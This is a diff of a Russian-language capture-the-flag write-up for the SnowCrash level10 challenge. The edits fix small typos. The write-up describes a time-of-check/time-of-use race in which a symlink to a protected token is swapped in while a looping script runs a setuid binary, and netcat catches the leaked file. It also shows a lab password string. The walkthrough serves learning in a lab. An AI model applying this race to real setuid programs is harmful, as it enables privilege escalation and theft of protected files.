@@ -10,7 +10,7 @@ level10@SnowCrash:~$ ls -la
         sends file to host if you have access to it
 
 level10@SnowCrash:~$ ./level10 token 192.168.56.105
-You don't have access to token
+You don't have access to token'
 
 
 level10@SnowCrash:~$ touch /tmp/1
@@ -35,7 +35,7 @@ printf("Unable to connect to host %s\n", "192.168.56.105"Unable to connect to ho
 ssh level10@192.168.56.105 -p4242
 s5cAJpM8ev6XHw998pRWG728z
 
-создаем три скрипта. в первом в цикле создаем файл удаляем его, создаем ссылку на наш токен с тем же именем что и файл который только что удалили
+создаем два скрипта. в первом в цикле создаем файл удаляем его, создаем ссылку на наш токен с тем же именем что и файл который только что удалили
 во втором скрипте в цикле запускаем наш бинарник с нашим файлом который создается в первом скрипте, надеемся что функция acces откроет файл с помощю функции опен, но туда попадает наша ссылка
 
 1. создаем и запускаем скрипт на создание файла и ссылки
@@ -56,7 +56,7 @@ sh /tmp/script
 
 2. создаем скрипт для спама
 
-vim /tmp/smap
+vim /tmp/spam
 
 #!/usr/bin/env bash
 while true
@@ -64,7 +64,7 @@ do
 	/home/user/level10/level10 /tmp/token 192.168.56.105
 done
 
-sh /tmp/smap
+sh /tmp/spam
 
 3. утилитой netcat слушаем порт 6969 https://ru.wikipedia.org/wiki/Netcat 
 nc -lk 6969
